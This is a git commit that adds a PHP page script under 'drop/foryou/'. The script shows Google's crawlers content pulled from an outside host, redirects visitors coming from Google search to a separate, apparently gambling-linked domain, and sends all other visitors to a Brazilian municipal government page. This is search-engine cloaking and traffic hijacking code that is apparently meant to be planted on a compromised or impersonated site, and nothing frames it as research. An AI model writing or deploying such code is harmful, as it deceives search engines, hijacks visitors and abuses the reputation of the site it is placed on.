8e76b76043217a994fa33cb99a5f6022207eca83
lastdrop1 <longtogel1efjr@gmail.com>
2025-08-08 23:26:22 +0700

    Create lastchoice.php

---
+++ drop/foryou/lastchoice.php
@@ -0,0 +1,35 @@
+<?php
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+
+    if (
+        stripos($ua, 'Googlebot') !== false ||
+        stripos($ua, 'Google-Site-Verification') !== false ||
+        stripos($ua, 'Google-InspectionTool') !== false
+    ) {
+        $ch = curl_init('https://cmdcabotucatu-sp.pages.dev/');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        $output = curl_exec($ch);
+        curl_close($ch);
+        echo $output;
+        exit;
+    }
+}
+
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $referer = $_SERVER['HTTP_REFERER'];
+
+    if (preg_match('/https?:\/\/(www\.)?google\.[a-z.]+/i', $referer)) {
+        header('Location: https://long85416.aksestanpalelet.com/redirlong');
+        exit;
+    }
+}
+
+
+profile_user();
+?>
+<?php
+header("Location: https://sistemas.botucatu.sp.gov.br/cmdca");
+exit();
+?>
